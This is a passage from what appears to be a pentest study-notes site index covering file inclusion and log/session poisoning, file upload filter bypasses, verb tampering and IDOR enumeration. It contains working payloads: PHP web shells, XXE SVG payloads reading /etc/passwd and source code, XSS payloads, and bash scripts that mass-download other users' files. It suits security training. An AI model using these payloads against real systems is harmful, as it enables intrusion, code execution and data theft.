the vulnerable function may not allow remote URL inclusion to begin with. So, a more reliable way to determine whether an LFI vulnerability is also vulnerable to RFI is to try and include a URL, and see if we can get its content. At first, we should always start by trying to include a local URL to ensure our attempt does not get blocked by a firewall or other security measures. So, let's use (http://127.0.0.1:80/index.php) as our input string and see if it gets included:</p>"},{"location":"zNew/Web/OWASP/FI/#remote-code-execution-with-rfi","title":"Remote Code Execution with RFI","text":"<p>The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell.</p> <p>Now, all we need to do is host this script and include it through the RFI vulnerability. It is a good idea to listen on a common HTTP port like 80 or 443, as these ports may be whitelisted in case the vulnerable web application has a firewall preventing outgoing connections. Furthermore, we may host the script through an FTP service or an SMB service, as we will see next.</p>"},{"location":"zNew/Web/OWASP/FI/#http","title":"HTTP","text":"<pre><code>$ sudo python3 -m http.server &lt;LISTENING_PORT&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#ftp","title":"FTP","text":"<pre><code>$ sudo python -m pyftpdlib -p 21\n</code></pre> <p>As we can see, this worked very similarly to our http attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:</p> <pre><code>$ curl 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=ftp://user:pass@localhost/shell.php&amp;cmd=id'\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#smb","title":"SMB","text":"<p>If the vulnerable web application is hosted on a Windows server (which we can tell from the server version in the HTTP response headers), then we do not need the allow_url_include setting to be enabled for RFI exploitation, as we can utilize the SMB protocol for the remote file inclusion. This is because Windows treats files on remote SMB servers as normal files, which can be referenced directly with a UNC path.</p> <pre><code>$ impacket-smbserver -smb2support share $(pwd)\n</code></pre> <p>Now, we can include our script by using a UNC path (e.g. \\\\share\\shell.php), and specify the command with (&amp;cmd=whoami) as we did earlier."},{"location":"zNew/Web/OWASP/FI/#log-poisoning","title":"Log Poisoning","text":"<p>Writing PHP code in a field we control that gets logged into a log file (i.e. poison/contaminate the log file), and then include that log file to execute the PHP code. For this attack to work, the PHP web application should have read privileges over the logged files, which vary from one server to another.</p>"},{"location":"zNew/Web/OWASP/FI/#php-session-poisoning","title":"PHP Session Poisoning","text":"<p>Most PHP web applications utilize PHPSESSID cookies, which can hold specific user-related data on the back-end, so the web application can keep track of user details through their cookies. These details are stored in session files on the back-end, and saved in /var/lib/php/sessions/ on Linux and in C:\\Windows\\Temp\\ on Windows. The name of the file that contains our user's data matches the name of our PHPSESSID cookie with the sess_ prefix. For example, if the PHPSESSID cookie is set to el4ukv0kqbvoirg7nkp4dncpk3, then its location on disk would be /var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3.</p> <p>The first thing we need to do in a PHP Session Poisoning attack is to examine our PHPSESSID session file and see if it contains any data we can control and poison. So, let's first check if we have a PHPSESSID cookie set to our session:</p> <p>As we can see, our PHPSESSID cookie value is nhhv8i0o6ua4g88bkdl9u1fdsd, so it should be stored at /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd. Let's try include this session file through the LFI vulnerability and view its contents:</p> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd\n</code></pre> <p>Let's try setting the value of page a custom value (e.g. language parameter) and see if it changes in the session file. We can do so by simply visiting the page with ?language=session_poisoning specified, as follows:</p> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=session_poisoning\n</code></pre> <p>Now, let's include the session file once again to look at the contents:</p> <p>This time, the session file contains session_poisoning instead of es.php, which confirms our ability to control the value of page in the session file. Our next step is to perform the poisoning step by writing PHP code to the session file. We can write a basic PHP web shell by changing the ?language= parameter to a URL encoded web shell, as follows:</p> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E\n</code></pre> <p>Finally, we can include the session file and use the &amp;cmd=id to execute a commands:</p> <pre><code>http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&amp;cmd=id\n</code></pre> <p><code>Note: To execute another command, the session file has to be poisoned with the web shell again, as it gets overwritten with /var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd after our last inclusion. Ideally, we would use the poisoned web shell to write a permanent web shell to the web directory, or send a reverse shell for easier interaction.</code></p>"},{"location":"zNew/Web/OWASP/FI/#server-log-poisoning","title":"Server Log Poisoning","text":"<p>Both Apache and Nginx maintain various log files, such as access.log and error.log. The access.log file contains various information about all requests made to the server, including each request's User-Agent header. As we can control the User-Agent header in our requests, we can use it to poison the server logs as we did above.</p> <p>Once poisoned, we need to include the logs through the LFI vulnerability, and for that we need to have read-access over the logs. Nginx logs are readable by low privileged users by default (e.g. www-data), while the Apache logs are only readable by users with high privileges (e.g. root/adm groups). However, in older or misconfigured Apache servers, these logs may be readable by low-privileged users.</p> <p>By default, Apache logs are located in /var/log/apache2/ on Linux and in C:\\xampp\\apache\\logs\\ on Windows, while Nginx logs are located in /var/log/nginx/ on Linux and in C:\\nginx\\log\\ on Windows. However, the logs may be in a different location in some cases, so we may use an LFI Wordlist to fuzz for their locations, as will be discussed in the next section.</p> <p>So, let's try including the Apache access log from /var/log/apache2/access.log, and see what we get:</p> <p>As we can see, we can read the log. The log contains the remote IP address, request page, response code, and the User-Agent header. As mentioned earlier, the User-Agent header is controlled by us through the HTTP request headers, so we should be able to poison this value.</p> <p>To do so, we will use Burp Suite to intercept our earlier LFI request and modify the User-Agent header to Apache Log Poisoning:</p> <pre><code>&lt;?php system($_GET['cmd']); ?&gt;\n</code></pre> <p>As expected, our custom User-Agent value is visible in the included log file. Now, we can poison the User-Agent header by setting it to a basic PHP web shell:</p> <p>As the log should now contain PHP code, the LFI vulnerability should execute this code, and we should be able to gain remote code execution. We can specify a command to be executed with (&amp;cmd=id):</p> <p>Finally, there are other similar log poisoning techniques that we may utilize on various system logs, depending on which logs we have read access over. The following are some of the service logs we may be able to read:</p> <ul> <li>/var/log/sshd.log</li> <li>/var/log/mail</li> <li>/var/log/vsftpd.log</li> </ul> <p>We should first attempt reading these logs through LFI, and if we do have access to them, we can try to poison them as we did above. For example, if the ssh or ftp services are exposed to us, and we can read their logs through LFI, then we can try logging into them and set the username to PHP code, and upon including their logs, the PHP code would execute. The same applies the mail services, as we can send an email containing PHP code, and upon its log inclusion, the PHP code would execute. We can generalize this technique to any logs that log a parameter we control and that we can read through the LFI vulnerability.</p>"},{"location":"zNew/Web/OWASP/FI/#automated-scanning","title":"Automated Scanning","text":"<p>It is essential to understand how file inclusion attacks work and how we can manually craft advanced payloads and use custom techniques to reach remote code execution. This is because in many cases, for us to exploit the vulnerability, it may require a custom payload that matches its specific configurations. Furthermore, when dealing with security measures like a WAF or a firewall, we have to apply our understanding to see how a specific payload/character is being blocked and attempt to craft a custom payload to work around it.</p>"},{"location":"zNew/Web/OWASP/FI/#fuzzing-parameters","title":"Fuzzing Parameters","text":"<p>The HTML forms users can use on the web application front-end tend to be properly tested and well secured against different web attacks. However, in many cases, the page may have other exposed parameters that are not linked to any HTML forms, and hence normal users would never access or unintentionally cause harm through. This is why it may be important to fuzz for exposed parameters, as they tend not to be as secure as public ones.</p> <pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?FUZZ=value' -fs 2287\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#lfi-wordlists","title":"LFI wordlists","text":"<p>There are a number of LFI Wordlists we can use for this scan. A good wordlist is LFI-Jhaddix.txt, as it contains various bypasses and common files, so it makes it easy to run several tests at once. We can use this wordlist to fuzz the ?language= parameter we have been testing throughout the module, as follows:</p> <pre><code>$ ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=FUZZ' -fs 2287\n</code></pre>"},{"location":"zNew/Web/OWASP/FI/#fuzzing-server-files","title":"Fuzzing Server Files","text":"<p>In addition to fuzzing LFI payloads, there are different server files that may be helpful in our LFI exploitation, so it would be helpful to know where such files exist and whether we can read them. Such files include: Server webroot path, server configurations file, and server logs.</p>"},{"location":"zNew/Web/OWASP/FI/#server-webroot","title":"Server Webroot","text":"<p>We may need to know the full server webroot path to complete our exploitation in some cases. For example, if we wanted to locate a file we uploaded, but we cannot reach its /uploads directory through relative paths (e.g. ../../uploads). In such cases, we may need to figure out the server webroot path so that we can locate our uploaded files through absolute paths instead of relative paths.</p> <p>To do so, we can fuzz for the index.php file through common webroot paths, which we can find in this Discovery/Web-Content/default-web-root-directory-linux.txt for Linux or this Discovery/Web-Content/default-web-root-directory-windows.txt for Windows. Depending on our LFI situation, we may need to add a few back directories (e.g. ../../../../), and then add our index.php afterwords.</p> <pre><code>$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ/index.php' -fs 2287\n</code></pre> <p>We may also use the same LFI-Jhaddix.txt wordlist we used earlier, as it also contains various payloads that may reveal the webroot. If this does not help us in identifying the webroot, then our best choice would be to read the server configurations, as they tend to contain the webroot and other important information, as we'll see next.</p>"},{"location":"zNew/Web/OWASP/FI/#server-logsconfigurations","title":"Server Logs/Configurations","text":"<p>As we have seen in the previous section, we need to be able to identify the correct logs directory to be able to perform the log poisoning attacks we discussed. Furthermore, as we just discussed, we may also need to read the server configurations to be able to identify the server webroot path and other important information (like the logs path!).</p> <p>To do so, we may also use the LFI-Jhaddix.txt wordlist, as it contains many of the server logs and configuration paths we may be interested in. If we wanted a more precise scan, we can use this wordlist for Linux or this wordlist for Windows, though they are not part of seclists, so we need to download them first. Let's try the Linux wordlist against our LFI vulnerability, and see what we get:</p> <pre><code>$ ffuf -w ./LFI-WordList-Linux -u 'http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/index.php?language=../../../../FUZZ' -fs 2287\n</code></pre>"},{"location":"zNew/Web/OWASP/FileUpload/","title":"FileUpload","text":""},{"location":"zNew/Web/OWASP/FileUpload/#_1","title":"FileUpload","text":""},{"location":"zNew/Web/OWASP/FileUpload/#file-upload","title":"File Upload","text":"<ul> <li>HackTricks</li> <li>PayLoads</li> <li>PayLoads</li> </ul>"},{"location":"zNew/Web/OWASP/FileUpload/#bypasses","title":"BYPASSES:","text":"<ul> <li> <p><code>Instead of .php, we can use .phar and use ?page=phar://uploads</code></p> </li> <li> <p><code>exiftool -comment=\"&lt;?php phpinfo(); ?&gt;\" nasa.png</code> - php into image</p> </li> </ul>"},{"location":"zNew/Web/OWASP/FileUpload/#bypassing-filters","title":"Bypassing Filters","text":""},{"location":"zNew/Web/OWASP/FileUpload/#identifying-web-framework","title":"Identifying Web Framework","text":"<p>Try visiting http://SERVER_IP:PORT/index.php, we would get the same page, which means that this is indeed a PHP web application. We do not need to do this manually, of course, as we can use a tool like Burp Intruder for fuzzing the file extension using a Web Extensions wordlist, as we will see in upcoming sections. This method may not always be accurate, though, as the web application may not utilize index pages or may utilize more than one web extension.</p> <p>Several other techniques may help identify the technologies running the web application, like using the Wappalyzer extension, which is available for all major browsers. Once added to our browser, we can click its icon to view all technologies running the web application.</p>"},{"location":"zNew/Web/OWASP/FileUpload/#client-side-validation","title":"Client-Side Validation","text":""},{"location":"zNew/Web/OWASP/FileUpload/#back-end-request-modification","title":"Back-end Request Modification","text":"<p>If we capture the upload request with Burp we can now modify this request to meet our needs without having the front-end type validation restrictions. If the back-end server does not validate the uploaded file type, then we should theoretically be able to send any file type/content, and it would be uploaded to the server.</p> <p>We modify the filename to shell.php and modify the content to the web shell.</p>"},{"location":"zNew/Web/OWASP/FileUpload/#disabling-front-end-validation","title":"Disabling Front-end Validation","text":"<p>To start, we can click [CTRL+SHIFT+C] to toggle the browser's Page Inspector, and then click on the profile image, which is where we trigger the file selector for the upload form.</p> <p>We can remove this function from the HTML code since its primary use appears to be file type validation, and removing it should not break anything.</p>"},{"location":"zNew/Web/OWASP/FileUpload/#blacklist-filters","title":"Blacklist Filters","text":""},{"location":"zNew/Web/OWASP/FileUpload/#blacklisting-extensions","title":"Blacklisting Extensions","text":""},{"location":"zNew/Web/OWASP/FileUpload/#fuzzing-extensions","title":"Fuzzing Extensions","text":"<p>As the web application seems to be testing the file extension, our first step is to fuzz the upload functionality with a list of potential extensions and see which of them return the previous error message. Any upload requests that do not return an error message, return a different message, or succeed in uploading the file, may indicate an allowed file extension.</p> <p>There are many lists of extensions we can utilize in our fuzzing scan. PayloadsAllTheThings provides lists of extensions for PHP and .NET web applications. We may also use SecLists list of common Web Extensions.</p> <p>We will also un-tick the URL Encoding option to avoid encoding the (.) before the file extension</p>"},{"location":"zNew/Web/OWASP/FileUpload/#whitelist-filters","title":"Whitelist Filters","text":""},{"location":"zNew/Web/OWASP/FileUpload/#whitelisting-extensions","title":"Whitelisting Extensions","text":""},{"location":"zNew/Web/OWASP/FileUpload/#double-extensions","title":"Double Extensions","text":"<p>For example, if the .jpg extension was allowed, we can add it in our uploaded file name and still end our filename with .php (e.g. shell.jpg.php), in which case we should be able to pass the whitelist test, while still uploading a PHP script that can execute PHP code.</p> <p>Fuzz the upload form with This Wordlist to find what extensions are whitelisted by the upload form.</p>"},{"location":"zNew/Web/OWASP/FileUpload/#reverse-double-extensions","title":"Reverse Double Extensions","text":""},{"location":"zNew/Web/OWASP/FileUpload/#character-injection","title":"Character Injection","text":"<p>Finally, let's discuss another method of bypassing a whitelist validation test through Character Injection. We can inject several characters before or after the final extension to cause the web application to misinterpret the filename and execute the uploaded file as a PHP script.</p> <p>The following are some of the characters we may try injecting:</p> <ul> <li><code>%20</code></li> <li><code>%0a</code></li> <li><code>%00</code></li> <li><code>%0d0a</code></li> <li><code>/</code></li> <li><code>.\\</code></li> <li><code>.</code></li> <li><code>\u2026</code></li> <li><code>:</code></li> </ul> <p>Each character has a specific use case that may trick the web application to misinterpret the file extension. For example, (shell.php%00.jpg) works with PHP servers with version 5.X or earlier, as it causes the PHP web server to end the file name after the (%00), and store it as (shell.php), while still passing the whitelist. The same may be used with web applications hosted on a Windows server by injecting a colon (:) before the allowed file extension (e.g. shell.aspx:.jpg), which should also write the file as (shell.aspx). Similarly, each of the other characters has a use case that may allow us to upload a PHP script while bypassing the type validation test.</p> <p>We can write a small bash script that generates all permutations of the file name, where the above characters would be injected before and after both the PHP and JPG extensions, as follows:</p> <pre><code>for char in '%20' '%0a' '%00' '%0d0a' '/' '.\\\\' '.' '\u2026' ':'; do\n    for ext in '.php' '.phps' '.php2' '.php3' '.php4' '.php5' '.php6' '.php7' '.pht' '.phtml' '.phar'; do\n        echo \"shell$char$ext.jpg\" &gt;&gt; wordlist.txt\n        echo \"shell$ext$char.jpg\" &gt;&gt; wordlist.txt\n        echo \"shell.jpg$char$ext\" &gt;&gt; wordlist.txt\n        echo \"shell.jpg$ext$char\" &gt;&gt; wordlist.txt\n    done\ndone\n</code></pre>"},{"location":"zNew/Web/OWASP/FileUpload/#type-filters","title":"Type Filters","text":"<p>There are two common methods for validating the file content: Content-Type Header or File Content. Let's see how we can identify each filter and how to bypass both of them.</p>"},{"location":"zNew/Web/OWASP/FileUpload/#content-type","title":"Content-Type","text":"<p>We may start by fuzzing the Content-Type header with SecLists' Content-Type through Burp Intruder, to see which types are allowed.</p> <p>Reduce the wordlist to the permitted content. </p> <pre><code>$ cat content-type.txt | grep 'image/' &gt; image-content-types.txt\n</code></pre> <p><code>Note: A file upload HTTP request has two Content-Type headers, one for the attached file (at the bottom), and one for the full request (at the top). We usually need to modify the file's Content-Type header, but in some cases the request will only contain the main Content-Type header (e.g. if the uploaded content was sent as POST data), in which case we will need to modify the main Content-Type header.</code></p>"},{"location":"zNew/Web/OWASP/FileUpload/#mime-type","title":"MIME-Type","text":"<p>The second and more common type of file content validation is testing the uploaded file's MIME-Type. Multipurpose Internet Mail Extensions (MIME) is an internet standard that determines the type of a file through its general format and bytes structure.</p> <p>This is usually done by inspecting the first few bytes of the file's content, which contain the File Signature or Magic Bytes. For example, if a file starts with (GIF87a or GIF89a), this indicates that it is a GIF image, while a file starting with plaintext is usually considered a Text file. If we change the first bytes of any file to the GIF magic bytes, its MIME type would be changed to a GIF image, regardless of its remaining content or extension.</p> <p>Add GIF8 before our PHP code to try to imitate a GIF image while keeping our file extension as .php, so it would execute PHP code regardless.</p>"},{"location":"zNew/Web/OWASP/FileUpload/#limited-file-uploads","title":"Limited File Uploads","text":"<p>Certain file types, like SVG, HTML, XML, and even some image and document files, may allow us to introduce new vulnerabilities to the web application by uploading malicious versions of these files. This is why fuzzing allowed file extensions is an important exercise for any file upload attack. It enables us to explore what attacks may be achievable on the web server. So, let's explore some of these attacks.</p>"},{"location":"zNew/Web/OWASP/FileUpload/#xss","title":"XSS","text":"<p>Many file types may allow us to introduce a Stored XSS vulnerability to the web application by uploading maliciously crafted versions of them.</p> <p>The most basic example is when a web application allows us to upload HTML files. Although HTML files won't allow us to execute code (e.g., PHP), it would still be possible to implement JavaScript code within them to carry an XSS or CSRF attack on whoever visits the uploaded HTML page. If the target sees a link from a website they trust, and the website is vulnerable to uploading HTML documents, it may be possible to trick them into visiting the link and carry the attack on their machines.</p> <p>Another example of XSS attacks is web applications that display an image's metadata after its upload. For such web applications, we can include an XSS payload in one of the Metadata parameters that accept raw text, like the Comment or Artist parameters.</p> <pre><code>$ exiftool -Comment=' \"&gt;&lt;img src=1 onerror=alert(window.origin)&gt;' image.jpg\n</code></pre> <p>When the image's metadata is displayed, the XSS payload should be triggered, and the JavaScript code will be executed to carry the XSS attack. Furthermore, if we change the image's MIME-Type to text/html, some web applications may show it as an HTML document instead of an image, in which case the XSS payload would be triggered even if the metadata wasn't directly displayed.</p> <p>Finally, XSS attacks can also be carried with SVG images, along with several other attacks. Scalable Vector Graphics (SVG) images are XML-based, and they describe 2D vector graphics, which the browser renders into an image. For this reason, we can modify their XML data to include an XSS payload. For example, we can write the following to svg.</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"&gt;\n&lt;svg xmlns=\"http://www.w3.org/2000/svg\" version=\"1.1\" width=\"1\" height=\"1\"&gt;\n    &lt;rect x=\"1\" y=\"1\" width=\"1\" height=\"1\" fill=\"green\" stroke=\"black\" /&gt;\n    &lt;script type=\"text/javascript\"&gt;alert(window.origin);&lt;/script&gt;\n&lt;/svg&gt;\n</code></pre>"},{"location":"zNew/Web/OWASP/FileUpload/#xxe","title":"XXE","text":"<p>Similar attacks can be carried to lead to XXE exploitation. With SVG images, we can also include malicious XML data to leak the source code of the web application, and other internal documents within the server. The following example can be used for an SVG image that leaks the content of (/etc/passwd):</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM \"file:///etc/passwd\"&gt; ]&gt;\n&lt;svg&gt;&amp;xxe;&lt;/svg&gt;\n</code></pre> <p>Once the above SVG image is uploaded and viewed, the XML document would get processed, and we should get the info of (/etc/passwd) printed on the page or shown in the page source. Similarly, if the web application allows the upload of XML documents, then the same payload can carry the same attack when the XML data is displayed on the web application.</p> <p>While reading systems files like /etc/passwd can be very useful for server enumeration, it can have an even more significant benefit for web penetration testing, as it allows us to read the web application's source files. Access to the source code will enable us to find more vulnerabilities to exploit within the web application through Whitebox Penetration Testing. For File Upload exploitation, it may allow us to locate the upload directory, identify allowed extensions, or find the file naming scheme, which may become handy for further exploitation.</p> <p>To use XXE to read source code in PHP web applications, we can use the following payload in our SVG image:</p> <pre><code>&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;\n&lt;!DOCTYPE svg [ &lt;!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=index.php\"&gt; ]&gt;\n&lt;svg&gt;&amp;xxe;&lt;/svg&gt;\n</code></pre> <p>Once the SVG image is displayed, we should get the base64 encoded content of index.php, which we can decode to read the source code.</p>"},{"location":"zNew/Web/OWASP/FileUpload/#dos","title":"DoS","text":"<p>Finally, many file upload vulnerabilities may lead to a Denial of Service (DOS) attack on the web server. For example, we can use the previous XXE payloads to achieve DoS attacks.</p> <p>Furthermore, we can utilize a Decompression Bomb with file types that use data compression, like ZIP archives. If a web application automatically unzips a ZIP archive, it is possible to upload a malicious archive containing nested ZIP archives within it, which can eventually lead to many Petabytes of data, resulting in a crash on the back-end server.</p> <p>Another possible DoS attack is a Pixel Flood attack with some image files that utilize image compression, like JPG or PNG. We can create any JPG image file with any image size (e.g. 500x500), and then manually modify its compression data to say it has a size of (0xffff x 0xffff), which results in an image with a perceived size of 4 Gigapixels. When the web application attempts to display the image, it will attempt to allocate all of its memory to this image, resulting in a crash on the back-end server.</p> <p>In addition to these attacks, we may try a few other methods to cause a DoS on the back-end server. One way is uploading an overly large file, as some upload forms may not limit the upload file size or check for it before uploading it, which may fill up the server's hard drive and cause it to crash or slow down considerably.</p> <p>If the upload function is vulnerable to directory traversal, we may also attempt uploading files to a different directory (e.g. ../../../etc/passwd), which may also cause the server to crash. Try to search for other examples of DOS attacks through a vulnerable file upload functionality.</p>"},{"location":"zNew/Web/OWASP/HTTPVerbTampering/","title":"HTTP Verb Tampering","text":"<p>An HTTP Verb Tampering attack exploits web servers that accept many HTTP verbs and methods. This can be exploited by sending malicious requests using unexpected methods, which may lead to bypassing the web application's authorization mechanism or even bypassing its security controls against other web attacks. HTTP Verb Tampering attacks are one of many other HTTP attacks that can be used to exploit web server configurations by sending malicious HTTP requests.</p>"},{"location":"zNew/Web/OWASP/HTTPVerbTampering/#attack","title":"Attack","text":"<p>Intercept request with Burp and change method to OPTIONS/POST/PUT/GET/PATCH(change request method burp option)</p>"},{"location":"zNew/Web/OWASP/HTTPVerbTampering/#bypassing-basic-authentication","title":"Bypassing Basic Authentication","text":"<p>Exploiting HTTP Verb Tampering vulnerabilities is usually a relatively straightforward process. We just need to try alternate HTTP methods to see how they are handled by the web server and the web application. While many automated vulnerability scanning tools can consistently identify HTTP Verb Tampering vulnerabilities caused by insecure server configurations, they usually miss identifying HTTP Tampering vulnerabilities caused by insecure coding. This is because the first type can be easily identified once we bypass an authentication page, while the other needs active testing to see whether we can bypass the security filters in place.</p>"},{"location":"zNew/Web/OWASP/HTTPVerbTampering/#identify","title":"Identify","text":"<p>To do so, we need to identify which pages are restricted by this authentication. If we examine the HTTP request after clicking the Reset button or look at the URL that the button navigates to after clicking it, we see that it is at /admin/reset.php. So, either the /admin directory is restricted to authenticated users only, or only the /admin/reset.php page is. </p>"},{"location":"zNew/Web/OWASP/HTTPVerbTampering/#exploit","title":"Exploit","text":"<p>We can send an OPTIONS request to it and see what HTTP methods are accepted.</p>"},{"location":"zNew/Web/OWASP/HTTPVerbTampering/#bypassing-security-filters","title":"Bypassing Security Filters","text":"<p>The other and more common type of HTTP Verb Tampering vulnerability is caused by Insecure Coding errors made during the development of the web application, which lead to web application not covering all HTTP methods in certain functionalities. This is commonly found in security filters that detect malicious requests. For example, if a security filter was being used to detect injection vulnerabilities and only checked for injections in POST parameters (e.g. $_POST['parameter']), it may be possible to bypass it by simply changing the request method to GET.</p>"},{"location":"zNew/Web/OWASP/HTTPVerbTampering/#identify_1","title":"Identify","text":"<p>No matter what we try, the web application properly blocks our requests and is secured against injection attempts. However, we may try an HTTP Verb Tampering attack to see if we can bypass the security filter altogether.</p>"},{"location":"zNew/Web/OWASP/HTTPVerbTampering/#exploit_1","title":"Exploit","text":"<p>To try and exploit this vulnerability, let's intercept the request in Burp Suite (Burp) and then use Change Request Method to change it to another method.</p> <p>To confirm whether we bypassed the security filter, we need to attempt exploiting the vulnerability the filter is protecting</p>"},{"location":"zNew/Web/OWASP/IDOR/","title":"IDOR","text":"<p>IDOR is among the most common web vulnerabilities and can lead to accessing data that should not be accessible by attackers. What makes this attack very common is essentially the lack of a solid access control system on the back-end. As web applications store users' files and information, they may use sequential numbers or user IDs to identify each item. Suppose the web application lacks a robust access control mechanism and exposes direct references to files and resources. In that case, we may access other users' files and information by simply guessing or calculating their file IDs.</p>"},{"location":"zNew/Web/OWASP/IDOR/#identifying-idors","title":"Identifying IDORs","text":""},{"location":"zNew/Web/OWASP/IDOR/#url-parameters-apis","title":"URL Parameters &amp; APIs","text":"<p>The very first step of exploiting IDOR vulnerabilities is identifying Direct Object References. Whenever we receive a specific file or resource, we should study the HTTP requests to look for URL parameters or APIs with an object reference (e.g. ?uid=1 or ?filename=file_1.pdf). These are mostly found in URL parameters or APIs but may also be found in other HTTP headers, like cookies.</p> <p>In the most basic cases, we can try incrementing the values of the object references to retrieve other data, like (?uid=2) or (?filename=file_2.pdf). We can also use a fuzzing application to try thousands of variations and see if they return any data. Any successful hits to files that are not our own would indicate an IDOR vulnerability.</p>"},{"location":"zNew/Web/OWASP/IDOR/#ajax-calls","title":"AJAX Calls","text":"<p>We may also be able to identify unused parameters or APIs in the front-end code in the form of JavaScript AJAX calls. Some web applications developed in JavaScript frameworks may insecurely place all function calls on the front-end and use the appropriate ones based on the user role.</p> <p>For example, if we did not have an admin account, only the user-level functions would be used, while the admin functions would be disabled. However, we may still be able to find the admin functions if we look into the front-end JavaScript code and may be able to identify AJAX calls to specific end-points or APIs that contain direct object references. If we identify direct object references in the JavaScript code, we can test them for IDOR vulnerabilities.</p>"},{"location":"zNew/Web/OWASP/IDOR/#understand-hashingencoding","title":"Understand Hashing/Encoding","text":"<p>Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If we find such parameters using encoded or hashed values, we may still be able to exploit them if there is no access control system on the back-end.</p>"},{"location":"zNew/Web/OWASP/IDOR/#compare-user-roles","title":"Compare User Roles","text":"<p>If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.</p>"},{"location":"zNew/Web/OWASP/IDOR/#mass-enumeration","title":"Mass Enumeration","text":"<p>We can click on [CTRL+SHIFT+C] in Firefox to enable the element inspector, and then click on any of the links to view their HTML source code.</p> <p>We can pick any unique word to be able to grep the link of the file. In our case, we see that each link starts with <li>. GET method to find resources <pre><code>#!/bin/bash\n\nurl=\"http://SERVER_IP:PORT\"\n\nfor i in {1..10}; do\n        for link in $(curl -s \"$url/documents.php?uid=$i\" | grep -oP \"\\/documents.*?.pdf\"); do\n                wget -q $url/$link\n        done\ndone\n</code></pre> <p>POST method to find resources</p> <pre><code>#!/bin/bash\n\n# Base URL\nbase_url=\"http://94.237.49.212:52909\"\n\n# User-Agent string for curl\nuser_agent=\"Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0\"\n\n# Loop through uid from 1 to 20\nfor uid in {1..20}; do\n\n  echo \"Fetching documents for uid=$uid...\"\n\n    # Make the POST request and extract file paths\n  files=$(curl \"${base_url}/documents.php\" --compressed -X POST \\\n\n    -H \"User-Agent: ${user_agent}\" \\\n\n    -H \"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\" \\\n\n    -H \"Accept-Language: en-US,en;q=0.5\" \\\n\n    -H \"Accept-Encoding: gzip, deflate\" \\\n\n    -H \"Content-Type: application/x-www-form-urlencoded\" \\\n\n    -H \"Origin: ${base_url}\" \\\n\n    -H \"Connection: keep-alive\" \\\n\n    -H \"Referer: ${base_url}/\" \\\n\n    -H \"Upgrade-Insecure-Requests: 1\" \\\n\n    --data-raw \"uid=${uid}\" | grep -oP \"\\/documents.*?\\.(pdf|doc|docx|txt|xlsx|xls|ppt|pptx)\")\n\n  # Download each file found\n\n  for file in $files; do\n\n    file_url=\"${base_url}${file}\"\n\n    echo \"Downloading $file_url...\"\n\n    wget -q \"$file_url\" -P downloaded_files\n\n  done\n\ndone\n\n\necho \"Download process complete.\"\n</code></pre>"},{"location":"zNew/Web/OWASP/IDOR/#bypassing-encoded-references","title":"Bypassing Encoded References","text":"<p>GET method to find resources</p> <pre><code>#!/bin/bash\nfor i in {1..20}; do\n    for hash in $(echo -n $i | base64 -w 0 | tr -d ' -'); do\n        curl -sOJ \"http://94.237.49.212:52909/download.php?contract=$hash\"\n    done\ndone\n</code></pre> <p>POST method to find resources</p> <pre><code>#!/bin/bash\nfor i in {1..10}; do\n    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do\n        curl -sOJ -X POST -d \"contract=$hash\" http://SERVER_IP:PORT/download.php\n    done\ndone\n</code></pre> <p>Cat files content</p> <pre><code>#!/bin/bash\n# Loop through all files in the current directory\nfor file in *; do\n    # Check if the file starts with \"contract\"\n    if [[ -f \"$file\" &amp;&amp; \"$file\" == contract* ]]; then\n        echo \"Contents of $file:\"\n        cat \"$file\"\n        echo \"\"  # Add a newline for better readability between file contents\n    fi\ndone\n</code></pre>"},{"location":"zNew/Web/OWASP/IDOR/#idor-in-insecure-apis","title":"IDOR in Insecure APIs","text":"<p>Intercept a request in Burp.</p> <ul> <li>Change unique objects identifiers GET/POST</li> <li>Forward every request to map endpoints</li> <li>Change different parameters(role) </li> <li>Perform HTTP Verb Tampering</li> </ul>"},{"location":"zNew/Web/OWASP/NOSQLI/","title":"NOSQL 